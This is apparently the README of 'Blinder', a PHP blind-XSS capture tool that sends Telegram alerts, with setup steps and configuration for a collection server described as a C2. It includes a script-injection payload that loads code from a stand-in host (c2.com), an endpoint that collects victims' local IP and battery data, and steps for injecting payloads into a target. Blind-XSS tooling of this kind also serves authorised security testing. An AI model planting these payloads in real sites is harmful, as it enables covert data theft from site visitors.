# Blinder

[![PHP Version](https://img.shields.io/badge/php-%3E%3D7.4-blue)](#) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](#)

**Blinder** is a self-hosted PHP-based Blind XSS detection and management tool designed to streamline vulnerability discovery, automate payload collection, and deliver real-time notifications via Telegram.

---

## ✨ Key Features

* **Blind XSS Detection**: Capture out-of-band XSS payloads.
* **Real-Time Telegram Alerts**: Get notified instantly on payload triggers.
* **Web Interface**: Centralized panel to monitor and manage data.
* **Flexible Payloads**: Works with customized payloads. To make changes, alter index.php (script portion).
* **Self-Hosted Support**: Integrate with your own C2 server.
* **Intrusive data**: Local NAT IP and system battery percentage is fetched.

---

## 📦 Installation

1. **Clone the repo**:

   ```bash
   git clone https://github.com/AamerShah/blinder.git
   cd blinder
   ```
2. **Install PHP dependencies**: Not necessary

   ```bash
   composer install
   ```
3. **Configure server**:

   * Set your document root to `public/`
   * Ensure PHP 7.4+ is installed with `curl` and `mbstring` extensions enabled

---

## ⚙️ Configuration

### 1. Telegram Bot Setup

* Edit `collect.php`:

  * Line 11: Set Telegram bot token:

    ```php
    $telegram_token = 'YOUR_TELEGRAM_BOT_TOKEN';
    ```
  * Line 12: Set chat/group ID:

    ```php
    $chat_id = 'YOUR_TELEGRAM_CHAT_ID';
    ```

  * Line 55 in `collect.php`:

    ```php
    $msg .= "<a href=\"https://c2.com/admin.php\">View full log</a>";
    ```

### 2. Host URL

* Line 6 in `index.php`:

  ```php
  const endpoint = 'https://c2.com/collect.php';
  ```

### 3. Set admin password

* Line 3 in `admin.php`:

  ```php
  $hardcoded_password = "Sup3r_S3cr3t";
  ```

---

## 💡 Usage Steps

1. **Host** the project on your server
2. **Generate XSS payload** from UI/CLI
3. **Inject** the payload into the target
4. **Wait** for alert in your Telegram
5. **Analyze** data via the dashboard
6. ***<script+src=//c2.com></script>***

---

## 🛡️ Security Best Practices

* Isolate the server from production assets
* Use HTTPS for all traffic
* Add access control via `.htpasswd` or firewall rules

---

## 📝 Contributions

Feel free to fork and submit PRs. Open issues for feature requests or bugs.

---

## 📄 License

Licensed under MIT. See [LICENSE](LICENSE) file.

---

**Developer:** [Aamer Shah](mailto:aamer@pm.me)
